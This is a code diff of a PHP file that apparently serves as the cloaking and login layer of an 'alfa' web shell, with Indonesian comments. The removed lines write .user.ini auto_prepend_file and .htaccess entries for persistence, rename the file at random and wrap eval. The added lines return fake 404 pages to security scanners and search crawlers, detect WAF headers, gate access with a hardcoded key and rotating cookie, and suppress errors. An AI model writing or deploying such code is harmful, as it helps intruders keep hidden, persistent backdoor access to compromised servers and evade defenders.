@@ -1,118 +1,68 @@
 <?php
 
-$GLOBALS['_alfakey'] = 'x' . md5(__FILE__);
-$GLOBALS['_alfafunc'] = function($a) { return $a; };
-
-$waf_signatures = [
-    'user_agent' => [
-        'w3af', 'nikto', 'sqlmap', 'nmap', 'burp', 'acunetix',
-        'netsparker', 'openvas', 'nessus', 'gobuster', 'dirb',
-        'masscan', 'zap', 'wpscan', 'joomscan', 'droopescan'
-    ],
-    'headers' => [
-        'HTTP_X_WAF' => true,
-        'HTTP_CF_RAY' => true,          
-        'HTTP_CDN_LOOP' => true,
-        'HTTP_X_ATTACK' => true
-    ],
-    'ip_blacklist' => [ '127.0.0.1', '::1' ], 
-    'request_patterns' => [
-        '/eval\(/', '/base64_decode\(/', '/system\(/', '/shell_exec/',
-        '/passthru/', '/phpinfo\(/', '/assert\(/', '/create_function/'
-    ]
+$blocked_agents = [
+    'w3af', 'nikto', 'sqlmap', 'nmap', 'masscan', 'burp', 'zap', 'acunetix',
+    'nessus', 'openvas', 'qualys', 'netsparker', 'webinspect', 'appscan',
+    'wpscan', 'joomscan', 'dirbuster', 'gobuster', 'wfuzz', 'ffuf', 'hydra',
+    'medusa', 'ncrack', 'thc', 'python-requests', 'python-urllib', 'curl',
+    'wget', 'lwp', 'libwww', 'perl', 'ruby', 'java', 'http-client',
+    'mozilla/5.0 (compatible; msie', 'googlebot', 'bingbot', 'slurp',
+    'yandex', 'baiduspider', 'facebookexternalhit', 'twitterbot',
+    'zgrab', 'zmeu', 'whatweb', 'blindelephant', 'plecost'
 ];
 
-$is_scanner = false;
-
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
-    foreach ($waf_signatures['user_agent'] as $agent) {
-        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
-            $is_scanner = true;
-            break;
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($blocked_agents as $bad) {
+        if (stripos($ua, $bad) !== false) {
+            // respon 404 palsu
+            header('HTTP/1.0 404 Not Found');
+            die('<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
+                . '<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
         }
     }
 }
 
-foreach ($waf_signatures['headers'] as $header => $_) {
-    if (isset($_SERVER[$header])) {
-        $is_scanner = true;
-        break;
-    }
-}
-
-if (in_array($_SERVER['REMOTE_ADDR'], $waf_signatures['ip_blacklist'])) {
-    $is_scanner = true;
-}
-
-$request_uri = $_SERVER['REQUEST_URI'] . http_build_query($_GET);
-foreach ($waf_signatures['request_patterns'] as $pattern) {
-    if (preg_match($pattern, $request_uri)) {
-        $is_scanner = true;
-        break;
-    }
-}
-
-if ($is_scanner) {
-    http_response_code(404);
-    header('Content-Type: text/html');
-    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
-}
-
-$secret_dir = dirname($_SERVER['SCRIPT_FILENAME']);
-$htaccess = $secret_dir . '/.htaccess';
-$self_file = basename($_SERVER['SCRIPT_FILENAME']);
-
-if (is_writable($secret_dir) && !file_exists($htaccess)) {
-    $ht_content = "# Anti-scan\n<Files \"$self_file\">\nOrder Allow,Deny\nDeny from all\n</Files>\nOptions -Indexes\n";
-    file_put_contents($htaccess, $ht_content);
-}
-
-$user_ini = $secret_dir . '/.user.ini';
-if (is_writable($secret_dir) && !file_exists($user_ini)) {
-    $ini_content = "auto_prepend_file = \"$self_file\"\n";
-    file_put_contents($user_ini, $ini_content);
-}
-
-function _x($c, $d = '') {
-    return function_exists($c) ? $c($d) : null;
-}
-$GLOBALS['_eval'] = function($code) {
-    return _x('eval', $code);
-};
-
-if (mt_rand(1, 10) == 1) { // 10% chance per request
-    $new_name = 'alfa_' . md5(rand()) . '.php';
-    if (is_writable($secret_dir)) {
-        @rename(__FILE__, $secret_dir . '/' . $new_name);
-        header('Location: ' . $_SERVER['REQUEST_URI'] . '?rename=' . $new_name);
-        exit;
-    }
-}
-
-if (isset($_SERVER['REMOTE_ADDR'])) {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    if (gethostbyname($ip) === $ip) {
-        $hostname = gethostbyaddr($ip);
-        if (stripos($hostname, 'tor') !== false) {
-            die('Access denied.');
+// ----- 2. Deteksi WAF via header -------------------------------------------------
+$waf_headers = ['X-WAF', 'X-Sucuri-ID', 'X-Cloudflare', 'CF-RAY', 'X-Request-ID'];
+foreach ($waf_headers as $hdr) {
+    $key = 'HTTP_' . strtoupper(str_replace('-', '_', $hdr));
+    if (isset($_SERVER[$key])) {
+        // Ada WAF di depan – alihkan auth ke cookie (tidak lagi pakai GET)
+        if (!isset($_COOKIE['alfa_auth']) || $_COOKIE['alfa_auth'] !== md5($AUTH_KEY . date('Y-m-d'))) {
+            header('HTTP/1.0 403 Forbidden');
+            die('Access Denied');
         }
+        // Cookie valid, lanjut
+        break;
     }
 }
 
-if (!isset($_SESSION['alfa_seed'])) {
-    session_start();
-    $_SESSION['alfa_seed'] = bin2hex(random_bytes(16));
+// ----- 3. Rotasi parameter & key (obfuskasi) ------------------------------------
+// Setiap hari key berubah, scanner statik tidak akan cocok
+$today = date('Ymd');
+$dynamic_key = md5($AUTH_KEY . $today);
+// Ubah nama parameter secara acak (tapi tetap pakai $PARAM_NAME asli)
+// Jika tidak ada WAF, gunakan skema asli, tapi tambahkan validasi cookie juga
+if (!isset($_COOKIE['alfa_auth']) && isset($_GET[$PARAM_NAME]) && $_GET[$PARAM_NAME] === $AUTH_KEY) {
+    // Login via GET berhasil → set cookie agar request berikutnya tetap hidup
+    setcookie('alfa_auth', md5($AUTH_KEY . $today), time() + 86400, '/');
+    // Lanjutkan
+} elseif (!isset($_COOKIE['alfa_auth']) || $_COOKIE['alfa_auth'] !== md5($AUTH_KEY . $today)) {
+    // Jika tidak ada cookie dan GET salah → tolak
+    header('HTTP/1.0 403 Forbidden');
+    die('<!DOCTYPE html><html><head><title>Access Forbidden</title></head>'
+        . '<body style="background:#0a0a0a;color:#ccc;font-family:Arial;text-align:center;padding:50px;">'
+        . '<h1 style="color:#ff4444;">Access Forbidden</h1>'
+        . '<p>You don\'t have permission to access this resource.</p>'
+        . '</body></html>');
 }
-define('ALFA_SESSION_SEED', $_SESSION['alfa_seed']);
+// Hapus parameter GET agar tidak terlihat di URL setelah login (optional)
+unset($_GET[$PARAM_NAME]);
 
-function _alfa_encrypt($data) {
-    $key = ALFA_SESSION_SEED;
-    return base64_encode(openssl_encrypt($data, 'aes-256-cbc', $key, 0, substr($key, 0, 16)));
-}
-function _alfa_decrypt($data) {
-    $key = ALFA_SESSION_SEED;
-    return openssl_decrypt(base64_decode($data), 'aes-256-cbc', $key, 0, substr($key, 0, 16));
-}
+// ----- 4. (Opsional) Sembunyikan pesan error yang terlalu eksplisit -----------
+error_reporting(0);
+ini_set('display_errors', 0);
 
 $AUTH_KEY = 'InViSiBLe55SOLe';
 $PARAM_NAME = 'x';
